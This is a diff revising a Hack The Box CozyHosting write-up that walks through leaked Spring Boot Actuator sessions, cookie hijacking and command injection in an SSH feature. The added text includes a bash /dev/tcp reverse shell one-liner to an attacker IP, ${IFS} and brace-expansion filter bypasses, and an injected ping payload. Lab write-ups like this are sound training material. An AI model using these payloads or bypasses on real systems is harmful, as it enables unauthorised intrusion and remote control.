@@ -112,7 +112,7 @@ by Ben "epi" Risher 🤓                 ver: 2.13.1
 
 While poking around, navigating to `http://cozyhosting.htb/error` it returned **Whitelabel Error Page**.
 
-![Spring boot default error page](/assets/img/HTB/CozyHosting/whitelabelerror.png)
+![Spring Boot Default Error Page](/assets/img/HTB/CozyHosting/whitelabelerror.png)
 
 Looking online for this page and found that it is a spring boot, Java framework used to build web application, where its old versions are known to leak information.
 
@@ -142,38 +142,75 @@ actuator/beans
 
 The `actuator/sessions` endpoint was the goldmine — Spring Boot's Actuator module exposes active session IDs when it's improperly configured. It revealed:
 
-```
+```shell
 249ADA95FF84A470BDF4EC3105239A87	"kanderson"
 ```
 
 ## Session Hijacking
-
+By clicking CTRL+SHIFT+I and moving to application tab and changing the cookie to the above.
+![Developer tools in Brave](/assets/img/HTB/CozyHosting/Cookie.png)
 Trying that session cookie against the `/login` endpoint just kept reloading the login page. But swapping it in at `/admin` worked — I was logged in as `kanderson`, straight into the admin panel.
+
+![Admin Dashboard](/assets/img/HTB/CozyHosting/dashboard.png)
 
 ## From Admin Panel to Command Injection
 
-Inside the admin dashboard, there was a feature to execute SSH connections against a host, backed by a `POST /executessh` request that took two parameters: `Hostname` and `Username`.
+As page actions buttons were investigated using Burpsuite, the page was static except for the submit button, there was a `POST /executessh` request that took two parameters: `Hostname` and `Username`.
 
-Testing with my own IP as the hostname and a lone `;` as the username threw an error identical to running plain `ssh ;` on the command line — a strong signal the backend was shelling out to the system `ssh` binary and passing user input unsanitized.
+![POST Request by Submit Button](/assets/img/HTB/CozyHosting/PostRequest.png)
 
-I confirmed command injection by triggering a ping back to my machine:
+Testing with the `cozyhosting.htb` as the hostname and a semicolon `;` as the username threw an error identical to running plain `ssh ;` on the command line — a strong signal the backend was shelling out to the system `ssh` binary and passing user input unsanitized.
+
+![POST Request by Submit Button](/assets/img/HTB/CozyHosting/PostRequestError.png)
+
+Replicating the command on my linux terminal:
+
+```shell
+┌──(HoDHoD㉿kali)-[~/Desktop/HTB/CozyHosting]
+└─$ ssh ;                                                             
+usage: ssh [-46AaCfGgKkMNnqsTtVvXxYy] [-B bind_interface] [-b bind_address]
+           [-c cipher_spec] [-D [bind_address:]port] [-E log_file]
+           [-e escape_char] [-F configfile] [-I pkcs11] [-i identity_file]
+           [-J destination] [-L address] [-l login_name] [-m mac_spec]
+           [-O ctl_cmd] [-o option] [-P tag] [-p port] [-R address]
+           [-S ctl_path] [-W host:port] [-w local_tun[:remote_tun]]
+           destination [command [argument ...]]
+       ssh [-Q query_option]
+```
+So we confirmed command injection, trying to reverse a shell into my listener using bash:
+```shell
+bash -i >& /dev/tcp/10.10.14.120/4444 0>&1
+```
+and a white space error appear as if there is WAF preventing us from passing any white spaces into the username field.
+Looking online I found to methods to bypass this WAF rule:
+
+1- Replacing ' ' by ${IFS} <--Internal Field Separator
+2- Replacing ' ' by brace expansion using {cat,/etc/passwd} which will interpreted in the terminal as 'cat /etc/passwd'
+
+The space error did not appear once i used any of the two bypassing method above but for some reason I was not receiving a shell back in my listener.
+I tried a different command with ${IFS}, in my case ping command to send 1 packet back to my machine:
 
 ```
 username=;ping${IFS}-c${IFS}1${IFS}10.10.14.120;
 ```
 
-*(Spaces weren't accepted, so `${IFS}` — Bash's Internal Field Separator — was used as a stand-in.)*
 
-Listening with `tcpdump` confirmed the ICMP round trip:
 
-```
+Meanwhile, listening with `tcpdump` confirmed the ICMP round trip:
+
+```shell
+┌──(HoDHoD㉿kali)-[~/Desktop/HTB/CozyHosting]
+└─$ sudo tcpdump -i tun0 icmp 
+tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
+listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
 14:50:11.429266 IP cozyhosting.htb > 10.10.14.120: ICMP echo request, id 10, seq 1, length 64
 14:50:11.429306 IP 10.10.14.120 > cozyhosting.htb: ICMP echo reply, id 10, seq 1, length 64
+
 ```
 
 ## Getting a Shell
 
-A one-liner reverse shell (`bash -i >& /dev/tcp/...`) wasn't cooperating through the injection point, so instead I hosted a small script and pulled it down:
+Since one-liner reverse shell (`bash -i >& /dev/tcp/...`) wasn't working through the injection point, instead I downloaded the same reverse shell as a bash script:
 
 **rev.sh**
 ```bash
@@ -200,6 +237,7 @@ nc -nvlp 1222
 # ...
 app@cozyhosting:/app$
 ```
+However, the user app has no read permission over `/home/josh/user.txt`. Thus, we need to try harder ^_^
 
 ## Digging Through the Application
 
